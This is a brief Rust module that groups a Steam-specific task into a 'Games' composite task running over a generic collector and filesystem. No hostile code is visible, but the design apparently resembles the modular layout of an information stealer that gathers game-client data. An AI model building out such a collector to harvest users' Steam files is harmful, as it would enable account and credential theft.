#![no_std]

extern crate alloc;
mod steam;

use crate::alloc::borrow::ToOwned;
use crate::steam::SteamTask;
use alloc::vec;
use collector::Collector;
use filesystem::FileSystem;
use tasks::Task;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask};

pub struct GamesTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector, F: FileSystem> Default for GamesTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(SteamTask),
        }
    }
}

impl_composite_task_runner!(GamesTask<C, F>, "Games");
